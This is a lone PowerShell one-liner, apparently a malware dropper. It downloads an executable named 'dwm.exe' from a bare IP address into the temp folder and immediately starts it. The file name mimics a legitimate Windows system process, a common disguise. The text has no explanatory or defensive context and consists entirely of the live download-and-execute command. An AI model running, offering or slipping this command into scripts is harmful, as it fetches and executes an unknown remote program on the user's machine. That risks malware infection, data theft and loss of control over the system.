(New-Object System.Net.WebClient).DownloadFile("http://163.172.144.82/ex/dwm.exe","$env:temp\dwm.exe");[System.Diagnostics.Process]::Start("$env:temp\dwm.exe")
